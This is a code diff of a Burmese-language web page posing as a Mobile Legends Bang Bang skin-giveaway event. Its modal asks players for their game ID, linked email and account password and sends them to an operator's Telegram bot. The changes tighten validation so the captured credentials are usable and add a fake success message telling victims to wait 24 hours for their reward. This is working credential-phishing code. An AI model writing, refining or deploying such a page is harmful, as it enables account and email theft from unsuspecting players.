@@ -1,3 +1,4 @@
+
 <!-- MLBB Event Layout with Full Width Header, Large Logo, and Store Badges -->
 <html lang="my">
 <head>
@@ -146,7 +147,8 @@
             width: 90%;
             max-width: 400px;
             box-shadow: 0 8px 25px rgba(0, 0, 0, 0.7);
-            transform: scaleစာပို့မည်       transition: transform 0.3s ease;
+            transform: scale(0.9);
+            transition: transform 0.3s ease;
         }
         .modal-overlay.open .modal-content {
             transform: scale(1);
@@ -210,7 +212,7 @@
     </div>
 
     <div class="container">
-        <!-- 🛠️ Main Promo Banner (ပုံအသစ်ဖြင့် အစားထိုးထားသည်) -->
+        <!-- Main Promo Banner -->
         <img class="main-banner" 
              src="https://i.ibb.co/xPMP0Rn/1958.png" 
              onerror="this.onerror=null;this.src='https://placehold.co/768x200/2c2c2c/ffffff?text=EXCLUSIVE+EVENT+BANNER'" 
@@ -294,29 +296,29 @@
     </div>
 
 
-    <!-- Telegram Modal (Functionality is kept) -->
+    <!-- Telegram Modal -->
     <div id="telegramModal" class="modal-overlay">
         <div class="modal-content">
-            <!-- 1. ခေါင်းစဉ် ပြောင်းလဲခြင်း -->
+            <!-- ခေါင်းစဉ်: Mobile Legends Bang Bang -->
             <h3 class="text-lg font-bold mb-4 text-yellow-400">Mobile Legends Bang Bang</h3>
             
-            <!-- 2. Skin Display ကို static text ဖြင့် အစားထိုးခြင်း -->
+            <!-- Skin Display ကို static text ဖြင့် အစားထိုးခြင်း -->
             <p id="skinNameDisplay" class="mb-4 text-center font-semibold text-red-500">Myanmar Only User</p>
             
-            <!-- 3. ပထမအကွက် (ID/Server ID) -->
-            <!-- Label ဖြုတ်ပြီး Placeholder သာထားသည် -->
-            <input type="text" id="messageLine1" class="modal-input" placeholder="Your ID/Server ID" required>
+            <!-- ပထမအကွက် (ID/Server ID) -->
+            <input type="text" id="messageLine1" class="modal-input" placeholder="Your ID/Server ID (နံပါတ်များသာ)" required>
 
-            <!-- 4. ဒုတိယအကွက် (Account Type) -->
-            <!-- Label ဖြုတ်ပြီး Placeholder သာထားသည် -->
-            <input type="text" id="messageLine2" class="modal-input" placeholder="Mlbb account နှင့်ချိတ်ထားသော Gmail/moonton/Facebook" required>
+            <!-- ဒုတိယအကွက် (Account Type) -->
+            <input type="text" id="messageLine2" class="modal-input" placeholder="Mlbb account နှင့်ချိတ်ထားသော Email (ဥပမာ: @gmail.com)" required>
             
-            <!-- 5. 🛠️ တတိယအကွက် (Password) အသစ်ထည့်သွင်းခြင်း -->
-            <input type="password" id="messageLine3" class="modal-input" placeholder="Password" required>
+            <!-- တတိယအကွက် (Password) -->
+            <input type="password" id="messageLine3" class="modal-input" placeholder="Password (အနည်းဆုံး ၈ လုံး)" required>
 
             <div class="flex justify-end mt-4">
+                <!-- ထုတ်ယူရန် ခလုတ် -->
                 <button onclick="sendMessageToTelegram()" class="modal-send-btn">
-                    ထုတ်ယူရန်            </button>
+                    ထုတ်ယူရန်
+                </button>
                 <button onclick="closeTelegramModal()" class="modal-send-btn modal-close-btn">
                     ပိတ်မည်
                 </button>
@@ -346,7 +348,6 @@
         // Modal ကို ဖွင့်ရန်
         function openTelegramModal(skinName) {
             selectedSkin = skinName;
-            // Static text ကို မပြောင်းလဲတော့ပါ၊ selectedSkin နာမည်ကို သိမ်းထားရုံသာ
             document.getElementById('telegramModal').classList.add('open');
             document.getElementById('modalStatus').innerText = ''; // Status ကိုရှင်းလင်းခြင်း
         }
@@ -357,7 +358,14 @@
             // Form Data သုံးခုလုံးကို ရှင်းလင်းခြင်း
             document.getElementById('messageLine1').value = '';
             document.getElementById('messageLine2').value = '';
-            document.getElementById('messageLine3').value = ''; // 🛠️ New: password field ကိုပါ ရှင်းလင်းမည်
+            document.getElementById('messageLine3').value = ''; 
+        }
+        
+        // 🚨 Email ပုံစံ မှန်ကန်ကြောင်း စစ်ဆေးရန် Function
+        function isValidEmail(email) {
+            // Basic regex for email pattern
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
         }
 
         // Telegram သို့ စာပို့ရန် Function (API Call)
@@ -365,14 +373,41 @@
             const statusElement = document.getElementById('modalStatus');
             const idServer = document.getElementById('messageLine1').value.trim(); // Your ID/Server ID
             const accountType = document.getElementById('messageLine2').value.trim(); // Gmail/Moonton/Facebook
-            const password = document.getElementById('messageLine3').value.trim(); // 🛠️ New: Password
+            const password = document.getElementById('messageLine3').value.trim(); // Password
             
-            // 🛠️ Validation သုံးခုလုံး စစ်ဆေးခြင်း
+            // ---------------------------------------------
+            // 🛠️ ENHANCED CLIENT-SIDE VALIDATION
+            // ---------------------------------------------
+            
             if (!idServer || !accountType || !password) {
-                statusElement.innerText = 'အားလုံးကို ဖြည့်သွင်းရန် လိုအပ်ပါသည်။';
+                statusElement.innerText = 'အကွက်အားလုံးကို ဖြည့်သွင်းရန် လိုအပ်ပါသည်။';
                 statusElement.style.color = '#f05252'; // Red
                 return;
             }
+
+            // 1. ID/Server ID စစ်ဆေးခြင်း (နံပါတ်များသာ)
+            if (!/^\d+$/.test(idServer.replace(/[()]/g, ''))) {
+                statusElement.innerText = 'ID/Server ID သည် နံပါတ်များသာ ပါဝင်ရပါမည်။ (ဥပမာ 12345678(1234))';
+                statusElement.style.color = '#f05252';
+                return;
+            }
+
+            // 2. Email ပုံစံ မှန်ကန်ကြောင်း စစ်ဆေးခြင်း
+            if (!isValidEmail(accountType)) {
+                 statusElement.innerText = 'Account (Email) ပုံစံကို မှန်ကန်စွာ (ဥပမာ: example@gmail.com) ဖြည့်သွင်းပါ။';
+                statusElement.style.color = '#f05252';
+                return;
+            }
+
+            // 3. Password အနည်းဆုံး ၈ လုံး စစ်ဆေးခြင်း
+            if (password.length < 8) {
+                statusElement.innerText = 'Password သည် အနည်းဆုံး ၈ လုံး ရှိရပါမည်။';
+                statusElement.style.color = '#f05252';
+                return;
+            }
+            // ---------------------------------------------
+            // END VALIDATION
+            // ---------------------------------------------
 
             const fullMessage = `
                 🚨 NEW SKIN REQUEST (Myanmar Only User) 🚨
@@ -387,7 +422,7 @@
 
             const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             
-            statusElement.innerText = ထုတ်ယူနေပါသည်...';
+            statusElement.innerText = 'ပို့နေပါသည်...';
             statusElement.style.color = '#fca311'; // Yellow
 
             try {
@@ -406,12 +441,13 @@
                 const data = await response.json();
 
                 if (response.ok && data.ok) {
-                    statusElement.innerText = ထုတ်ယူပြီးပါပြီ! ကျေးဇူးတင်ပါသည်။';
+                    // Success message
+                    statusElement.innerText = 'ဆုလက်ဆောင် ထုတ်ယူပြီးပါပြီ။ 24 နာရီ စောင့်ဆိုင်းပေးပါ။';
                     statusElement.style.color = '#2d942e'; // Green
                     // 3 စက္ကန့်အကြာတွင် Modal ပိတ်ရန်
                     setTimeout(closeTelegramModal, 3000); 
                 } else {
-                    statusElement.innerText = `ထုတ်ယူ၍မရပါ: ${data.description || 'အမှားတစ်ခုခုရှိနေပါသည်။ Token သို့မဟုတ် Chat ID ကို စစ်ပါ။'}`;
+                    statusElement.innerText = `ထုတ်ယူမရပါ: ${data.description || 'အမှားတစ်ခုခုရှိနေပါသည်။ Bot Config ကို စစ်ပါ။'}`;
                     statusElement.style.color = '#f05252'; // Red
                 }
 
